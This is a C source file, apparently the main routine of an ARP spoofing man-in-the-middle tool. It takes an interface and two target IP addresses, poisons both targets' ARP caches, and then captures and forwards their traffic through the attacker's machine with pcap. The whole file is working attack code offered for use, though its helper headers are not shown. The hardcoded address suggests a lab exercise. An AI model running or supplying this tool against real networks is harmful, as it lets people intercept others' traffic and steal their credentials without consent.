#include <stdio.h>
#include <sys/types.h> // for u_char
#include <arpa/inet.h> // for htons, inet_addr
#include <pcap/pcap.h> // for pcap_loop
#include <string.h> // for memcpy
#include <stdlib.h> // for exit
#include "find_target_ethernet_address.h"
#include "find_ethernet_address.h"
#include "arp_cache_poison.h"
#include "pcap_init.h"
#include "packet_forward.h"
#include "header.h"

int main(int argc, char**argv) {

	if (argc != 4) {
		printf("The parameter is invalid \n");
		printf("./arp_spoofing_attack <interface_name> <target1_ip_address> <target2_ip_address> \n");
		exit(1);
	}

	char *interface_name = argv[1];
	unsigned long target1_ip_address = inet_addr(argv[2]);
	unsigned long target2_ip_address = inet_addr(argv[3]);
	unsigned long my_ip_address = inet_addr("192.168.64.1");

	u_char *target1_ethernet_address = get_target_ethernet_address(interface_name, (u_char*)&my_ip_address, (u_char*)&target1_ip_address);
	u_char *target2_ethernet_address = get_target_ethernet_address(interface_name, (u_char*)&my_ip_address, (u_char*)&target2_ip_address);

	arp_cache_poison(interface_name, target1_ethernet_address, (u_char*)&target1_ip_address, target2_ethernet_address, (u_char*)&target2_ip_address);

	u_char callback_args[sizeof(struct forward_struct)];
	struct forward_struct *forward_struct = (struct forward_struct*) callback_args;
	memcpy(forward_struct->target1_ethernet_address, target1_ethernet_address, ETH_ALEN);
	memcpy(forward_struct->target2_ethernet_address, target2_ethernet_address, ETH_ALEN);
	memcpy(forward_struct->attackers_ethernet_address, find_ethernet_address(interface_name), ETH_ALEN);
	memcpy(forward_struct->interface_name, interface_name, strlen(interface_name) + 1);

	int send_socket = socket(AF_INET, SOCK_PACKET, htons(ETH_P_ARP));
	if(send_socket < 0) {
		printf("Failed to create send socket for fowarding.\n");
		exit(1);
	}
	forward_struct->send_socket = send_socket;

	pcap_t *handle = init_pcap(interface_name);
	pcap_loop(handle, 100000, forward_packet, callback_args);
	printf("\n");
	
	return 0;
}
